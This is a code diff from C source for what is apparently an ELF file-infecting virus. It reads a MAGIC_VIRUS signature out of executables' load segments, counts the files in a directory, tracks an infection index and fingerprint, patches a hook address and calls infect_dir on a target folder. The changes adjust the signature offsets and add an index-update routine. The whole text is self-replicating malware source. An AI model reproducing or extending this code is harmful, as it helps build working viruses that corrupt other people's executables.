@@ -348,13 +348,13 @@ static int	get_index_file(char *path)
     	{
     	    if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
     	    {
-    	        addr_magic = file + header->p_offset + header->p_filesz;
-    	        magic = *((uint32_t *)(addr_magic - SIGN_SIZE - 4));
+    	        addr_magic = file + header->p_offset + header->p_filesz - SIGN_SIZE - 8;
+    	        magic = *((uint32_t *)(addr_magic));
     	        if (magic == MAGIC_VIRUS)
-		{
-			index = (*((uint32_t *)(addr_magic - 0)));
-			goto end_fct;
-		}
+				{
+					index = (*((uint32_t *)(addr_magic - 5)));
+					goto end_fct;
+				}
     	    }
     	    header++;
     	    i++;
@@ -366,16 +366,15 @@ static int	get_index_file(char *path)
 	return index;
 }
 
-static int	get_highest_index(char *path)
+static int	get_highest_index(char *path, t_fingerprint *fingerprint)
 {
 	char			buf_d[1024];
 	struct linux_dirent64	*dir;
 	int			fd, n_read, pos;
-	uint32_t		index, nb_file, tmp_index;
+	uint32_t		index, tmp_index;
 	char			buf_path_file[PATH_MAX];
 	
 	index = 0;
-	nb_file = 0x41414141;
 	n_read = 0;
 	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
 		return (1);
@@ -386,7 +385,7 @@ static int	get_highest_index(char *path)
 			dir = (struct linux_dirent64 *)(buf_d + pos);
 			if (dir->d_type == 8) //dt_reg
 			{
-				nb_file++;
+				fingerprint->fingerprint += 1;
 				ft_memcpy(buf_path_file, path, PATH_MAX);
 				ft_strcat(buf_path_file, dir->d_name);
 				tmp_index = get_index_file(buf_path_file);
@@ -397,7 +396,7 @@ static int	get_highest_index(char *path)
 		}
 	}
 	ft_sysclose(fd);
-	return (index + nb_file);
+	return (index);
 }
 
 
@@ -461,6 +460,12 @@ void	close_entries(void)
 	ft_memcpy(addr_hook, &addr_origin, 4);
 }
 
+void	update_own_index(t_fingerprint *fingerprint)
+{
+	if (fingerprint->index < 0x41414141)
+		fingerprint->index = 0x41414141;
+}
+
 int		main()
 {
 	char			buf[BUF_SIZE];
@@ -477,12 +482,20 @@ int		main()
 		return (0);
 	write_begin(buf);
 	ft_syswrite(1, buf, 8);
+
 	write_test2(buf_path);
-	tmp_index = get_highest_index(buf_path);
+	fingerprint.fingerprint = 0;
+	tmp_index = get_highest_index(buf_path, &fingerprint);
+
 	write_test(buf_path);
-	fingerprint.index = get_highest_index(buf_path);
+	fingerprint.index = get_highest_index(buf_path, &fingerprint);
+
 	if (tmp_index > fingerprint.index)
 		fingerprint.index = tmp_index;
+
+	update_own_index(&fingerprint); // update fingerprint.index and update own exec
+
+	fingerprint.index += fingerprint.fingerprint;
 	fingerprint.fingerprint = fingerprint.index;
 	infect_dir(buf_path, &fingerprint);
 	write_test2(buf_path);
